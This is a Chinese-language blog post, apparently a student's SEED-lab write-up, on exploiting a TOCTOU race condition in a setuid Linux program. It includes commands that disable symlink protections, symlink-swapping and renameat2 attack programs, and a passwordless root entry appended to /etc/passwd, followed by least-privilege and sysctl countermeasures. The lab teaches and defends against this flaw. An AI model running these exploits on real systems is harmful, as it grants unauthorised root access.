@@ -1,0 +1,874 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/image/atom1.png">
+  <link rel="icon" href="/image/atom1.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#153b6e">
+  <meta name="author" content="郭佳明">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="lab setup&#x2F;tmp目录具有Sticky Bit（SBIT），可以看到权限是drwxrwxrwt，这意味着任何人都可以在 &#x2F;tmp内新增、修改文件，但仅有该文件&#x2F;目录建立者与 root 能够删除自己的目录或文件 1drwxrwxrwt  24 root root 4.0K Nov  1 20:09 tmp&#x2F;  Linux的保护机制：  “symlinks in world-writable">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SEED-lab：Race Condition Vulnerability Lab">
+<meta property="og:url" content="http://gls.show/p/529b2f3d/index.html">
+<meta property="og:site_name" content="郭佳明的博客">
+<meta property="og:description" content="lab setup&#x2F;tmp目录具有Sticky Bit（SBIT），可以看到权限是drwxrwxrwt，这意味着任何人都可以在 &#x2F;tmp内新增、修改文件，但仅有该文件&#x2F;目录建立者与 root 能够删除自己的目录或文件 1drwxrwxrwt  24 root root 4.0K Nov  1 20:09 tmp&#x2F;  Linux的保护机制：  “symlinks in world-writable">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://gls.show/image/seed/seed2.0_vm.jpg">
+<meta property="article:published_time" content="2022-10-29T16:42:25.713Z">
+<meta property="article:modified_time" content="2022-11-02T11:06:50.182Z">
+<meta property="article:author" content="郭佳明">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://gls.show/image/seed/seed2.0_vm.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>SEED-lab：Race Condition Vulnerability Lab - 郭佳明的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"gls.show","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>郭佳明的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/image/mountain1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SEED-lab：Race Condition Vulnerability Lab"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-30 00:42" pubdate>
+          2022年10月30日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          4.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          16 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">SEED-lab：Race Condition Vulnerability Lab</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    <!-- compatible with older versions-->
+                    本文最后更新于：2022年11月2日 晚上
+                  
+                
+              </p>
+            
+            <div class="markdown-body">
+              
+              <h1 id="lab-setup"><a href="#lab-setup" class="headerlink" title="lab setup"></a>lab setup</h1><p>/tmp目录具有Sticky Bit（SBIT），可以看到权限是drwxrwxrwt，这意味着任何人都可以在 /tmp内新增、修改文件，但仅有该文件/目录建立者与 root 能够删除自己的目录或文件</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">drwxrwxrwt</span>  <span class="hljs-number">24</span> root root <span class="hljs-number">4</span>.<span class="hljs-number">0</span>K Nov  <span class="hljs-number">1</span> <span class="hljs-number">20</span>:<span class="hljs-number">09</span> tmp/<br></code></pre></td></tr></table></figure>
+
+<p>Linux的保护机制：</p>
+<ul>
+<li>“symlinks in world-writable sticky directories (e.g./tmp) cannot be followed if the follower and directory owner do not match the symlink owner.”</li>
+<li>prevents the root from writing to the files in /tmp that are owned by others. In this lab, we need to disable these protections.</li>
+</ul>
+<p>具体可以参见：<a target="_blank" rel="noopener" href="https://wiki.ubuntu.com/Security/Features#Symlink_restrictions">https://wiki.ubuntu.com/Security/Features#Symlink_restrictions</a></p>
+<p>Stack Overflow上也有类似的问题：<a target="_blank" rel="noopener" href="https://unix.stackexchange.com/questions/355033/permissions-of-symlinks-inside-tmp">https://unix.stackexchange.com/questions/355033/permissions-of-symlinks-inside-tmp</a></p>
+<p>为了实验的正常进行，关闭保护机制：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo sysctl -w fs.protected_symlinks=0</span><br><span class="hljs-meta">$</span><span class="bash"> sudo sysctl fs.protected_regular=0</span><br></code></pre></td></tr></table></figure>
+
+<p>一个容易受到攻击的程序：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span>* fn = <span class="hljs-string">&quot;/tmp/XYZ&quot;</span>;<br>    <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">60</span>];<br>    FILE* fp;<br><br>    <span class="hljs-comment">/* get user input */</span><br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%50s&quot;</span>, buffer);<br><br>    <span class="hljs-keyword">if</span> (!access(fn, W_OK)) &#123;<br>        fp = fopen(fn, <span class="hljs-string">&quot;a+&quot;</span>);<br>        <span class="hljs-keyword">if</span> (!fp) &#123;<br>            perror(<span class="hljs-string">&quot;Open failed&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        fwrite(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>), <span class="hljs-number">1</span>, fp);<br>        fwrite(buffer, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>), <span class="hljs-built_in">strlen</span>(buffer), fp);<br>        fclose(fp);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No permission \n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>access() system call checks if the Real User ID has write access to /tm/X.After the check, the file is opened for writing</li>
+<li>open() checks the effective user id which is 0 and hence file will be opened</li>
+<li>root用户可以在任意文件执行写操作</li>
+</ul>
+<p><img src="/image/racecondition.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Task-1-Choosing-Our-Target"><a href="#Task-1-Choosing-Our-Target" class="headerlink" title="Task 1: Choosing Our Target"></a>Task 1: Choosing Our Target</h1><p>在<code>/etc/passwd</code>文件中，每个用户都有一个条目（行），用冒号(:)分隔的七个字段组成。下面是一个栗子：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">root:x:0:0:root:/root:/bin/bash<br></code></pre></td></tr></table></figure>
+
+<p>从左到右分别是：</p>
+<ul>
+<li>用户名</li>
+<li>密码</li>
+<li>User ID </li>
+<li>Group ID</li>
+<li>注释</li>
+<li>home directory</li>
+<li>用户登录后执行的命令</li>
+</ul>
+<p>密码字段是x，表示密码存储在影子文件/etc/shadow中，需要在影子文件中查找。如果用真实密码替换掉x，那么就会直接使用这个密码（hash值），而不是在影子文件中查找</p>
+<p>Ubuntu中有一个无密码账户的魔法值<code>U6aMy0wojraho </code>，如果我们将此值放在用户条目的密码字段中，那么只需在提示输入密码时按一下回车键即可</p>
+<p>向<code>/etc/passwd</code>文件添加如下记录</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">test:U6aMy0wojraho:0:0:test:/root:/bin/bash<br></code></pre></td></tr></table></figure>
+
+<p>可以创建一个具有 root 特权的新用户帐户，且不需输入密码直接回车即可，验证确实如此</p>
+<h1 id="Task-2-Launching-the-Race-Condition-Attack"><a href="#Task-2-Launching-the-Race-Condition-Attack" class="headerlink" title="Task 2: Launching the Race Condition Attack"></a>Task 2: Launching the Race Condition Attack</h1><h2 id="Task-2-A-Simulating-a-Slow-Machine"><a href="#Task-2-A-Simulating-a-Slow-Machine" class="headerlink" title="Task 2.A: Simulating a Slow Machine"></a>Task 2.A: Simulating a Slow Machine</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span>* fn = <span class="hljs-string">&quot;/tmp/XYZ&quot;</span>;<br>    <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">60</span>];<br>    FILE* fp;<br><br>    <span class="hljs-comment">/* get user input */</span><br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%50s&quot;</span>, buffer);<br><br>    <span class="hljs-keyword">if</span> (!access(fn, W_OK)) &#123;<br>	    sleep(<span class="hljs-number">10</span>);<br>        fp = fopen(fn, <span class="hljs-string">&quot;a+&quot;</span>);<br>        <span class="hljs-keyword">if</span> (!fp) &#123;<br>            perror(<span class="hljs-string">&quot;Open failed&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        fwrite(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>), <span class="hljs-number">1</span>, fp);<br>        fwrite(buffer, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>), <span class="hljs-built_in">strlen</span>(buffer), fp);<br>        fclose(fp);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No permission \n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>编译上面程序为root所有的4755权限的可执行程序</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">[11/01/22]seed@VM:~/.../Labsetup$ ln -sf /dev/null /tmp/XYZ<br>[11/01/22]seed@VM:~/.../Labsetup$ a.out <br>test:U6aMy0wojraho:0:0:test:/root:/bin/bash<br>[11/01/22]seed@VM:~/.../Labsetup$ ln -sf /etc/passwd /tmp/XYZ<br></code></pre></td></tr></table></figure>
+
+<p>攻击成功，可以su test无密码登录</p>
+<h2 id="Task-2-B-The-Real-Attack"><a href="#Task-2-B-The-Real-Attack" class="headerlink" title="Task 2.B: The Real Attack"></a>Task 2.B: The Real Attack</h2><p>注释掉上面程序的sleep语句，在一个更加贴合正常情境进行攻击</p>
+<p>有三个程序：</p>
+<ul>
+<li>vulp。被注释掉sleep的setuid程序，也是我们攻击的对象</li>
+<li>attack。不停的更改软链接的指向</li>
+<li>target_process.sh。不停的执行vulp程序，直到vulp成功被攻击，也即是/etc/passwd文件中被追加一行<code>test:U6aMy0wojraho:0:0:test:/root:/bin/bash</code></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>CHECK_FILE=&quot;ls -l /etc/passwd&quot;<br>old=$($CHECK_FILE)<br>new=$($CHECK_FILE)<br>while [ &quot;$old&quot; == &quot;$new&quot; ]  <br>do<br>   echo &quot;test:U6aMy0wojraho:0:0:test:/root:/bin/bash&quot; | ./vulp <br>   new=$($CHECK_FILE)<br>done<br>echo &quot;STOP... The passwd file has been changed&quot;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;unistd.h&gt;</span> </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123; <br>	<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123; <br>		unlink(<span class="hljs-string">&quot;/tmp/XYZ&quot;</span>); <br>		symlink(<span class="hljs-string">&quot;/dev/null&quot;</span>, <span class="hljs-string">&quot;/tmp/XYZ&quot;</span>); <br>		usleep(<span class="hljs-number">100</span>); <br>		unlink(<span class="hljs-string">&quot;/tmp/XYZ&quot;</span>); <br>		symlink(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, <span class="hljs-string">&quot;/tmp/XYZ&quot;</span>); <br>		usleep(<span class="hljs-number">100</span>); <br>	&#125;<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>/tmp/XYZ每一百毫秒更改一次指向，在指向/dev/null和/etc/passwd之间左右横跳</p>
+<p><img src="/image/Snipaste_2022-11-02_16-30-22.png" srcset="/img/loading.gif" lazyload></p>
+<p>在一个shell中运行target_process.sh，另一个shell中运行attack，在几秒内即可攻击成功，发现/etc/passwd中追加了一行<code>test:U6aMy0wojraho:0:0:test:/root:/bin/bash </code></p>
+<h2 id="Task-2-C-An-Improved-Attack-Method"><a href="#Task-2-C-An-Improved-Attack-Method" class="headerlink" title="Task 2.C: An Improved Attack Method"></a>Task 2.C: An Improved Attack Method</h2><p>上面的attack.c程序具有竞争条件漏洞，因为当access之后，open之前可能会unlink一下，然后open之后/tmp/xyz就会成为一个root所有的程序，此后攻击程序将无法再更改/tmp/xyz</p>
+<blockquote>
+<p><code>/tmp</code> 文件夹有一个“粘性”位，此目录下的文件的所有者才能删除该文件</p>
+</blockquote>
+<p>改良后的attack.c：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags = RENAME_EXCHANGE;<br>    unlink(<span class="hljs-string">&quot;/tmp/XYZ&quot;</span>); symlink(<span class="hljs-string">&quot;/dev/null&quot;</span>, <span class="hljs-string">&quot;/tmp/XYZ&quot;</span>);<br>    unlink(<span class="hljs-string">&quot;/tmp/ABC&quot;</span>); symlink(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, <span class="hljs-string">&quot;/tmp/ABC&quot;</span>);<br>	<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>    	renameat2(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;/tmp/XYZ&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;/tmp/ABC&quot;</span>, flags);<br>	&#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>新程序使用renameat2系统调用自动切换链接指向，这允许我们在不引入任何竞态条件的情况下更改/tmp/XYZ 指向的内容</p>
+<p>重复task2B操作，攻击成功</p>
+<h1 id="Task-3-Countermeasures"><a href="#Task-3-Countermeasures" class="headerlink" title="Task 3: Countermeasures"></a>Task 3: Countermeasures</h1><h2 id="Task-3-A-Applying-the-Principle-of-Least-Privilege"><a href="#Task-3-A-Applying-the-Principle-of-Least-Privilege" class="headerlink" title="Task 3.A: Applying the Principle of Least Privilege"></a>Task 3.A: Applying the Principle of Least Privilege</h2><p>最小特权原则：使用 seteuid 系统调用暂时禁用 root 权限，然后在必要时启用它</p>
+<blockquote>
+<p>在执行易受攻击的函数之前，我们禁用特权; 在易受攻击的函数返回之后，我们重新启用该特权</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">uid_t</span> uid = getuid(); <span class="hljs-comment">//真实用户id</span><br>	<span class="hljs-keyword">uid_t</span> euid = geteuid();<span class="hljs-comment">//有效用户id，如果是setuid程序那么会具有root权限 </span><br>	seteuid(uid); <br>	<br>	<span class="hljs-comment">/* 执行不需要root特权的操作 */</span><br>	<br>	seteuid(euid); <br>   	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="Task-3-B-Using-Ubuntu’s-Built-in-Scheme"><a href="#Task-3-B-Using-Ubuntu’s-Built-in-Scheme" class="headerlink" title="Task 3.B: Using Ubuntu’s Built-in Scheme"></a>Task 3.B: Using Ubuntu’s Built-in Scheme</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">// On Ubuntu 16.04 and 20.04, use the following command:<br><span class="hljs-meta">$</span><span class="bash"> sudo sysctl -w fs.protected_symlinks=1</span><br>// On Ubuntu 12.04, use the following command:<br><span class="hljs-meta">$</span><span class="bash"> sudo sysctl -w kernel.yama.protected_sticky_symlinks=1</span><br></code></pre></td></tr></table></figure>
+
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/SEED-lab/" class="category-chain-item">SEED-lab</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SEED-lab：Race Condition Vulnerability Lab</div>
+      <div>http://gls.show/p/529b2f3d/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>郭佳明</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年10月30日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/p/cd0d68e2/" title="一个基于 LKM 的 Linux 内核级 rootkit 的实现">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">一个基于 LKM 的 Linux 内核级 rootkit 的实现</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/p/219af9ac/" title="CSAPP-lab：shell lab">
+                        <span class="hidden-mobile">CSAPP-lab：shell lab</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
